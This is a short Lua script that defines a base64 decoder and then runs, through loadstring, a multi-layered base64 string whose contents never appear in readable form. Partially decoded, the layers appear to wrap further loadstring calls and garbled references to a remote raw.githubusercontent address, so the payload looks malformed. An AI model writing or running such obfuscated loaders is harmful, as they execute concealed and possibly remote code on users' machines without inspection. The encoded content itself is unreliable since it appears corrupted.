-- BASE64 DECODE
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

local function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do
            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do
            c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)
        end
        return string.char(c)
    end))
end

-- LAYER 1
loadstring(dec("bG9hZHN0cmluZyhkZWMoImJHOWhaSE4wY21sdVp5aGtaV00oSW1KSGI5a1pXMWhaR2x1WnlJc0ltSnBiR2x1WnlJNklDSm9kSFJ3Y3pvdkwzSmhkM2N1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwyUmhkV05sY21KdmJtbHZibVZ1ZEhNdWFXUWlMQ0pwYzNOMWFXTmhkR2x2Ymk1amIyMGlMQ0pwYzNOMWFXTmhkR2x2Ymk1amIyMGlPaUFpWTJ4cFlYUnBiMjRpTENKcGMzTjFhVzVoZEdsdmJpNWpiMjBpT2lBaWIzSm5JanBiSW1oMGRIQTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMlJoZEdObGNtSnZibW12Ym1WdWRITXVaR2xqZENJc0ltbHpkWE5sY2lJc0ltbHpkWE5sY2lJc0ltbHpkWE5sY2lJc0ltbHpkWE5sY2lJc0ltbHpkWE5sY2lKOSIpKSgp"))()
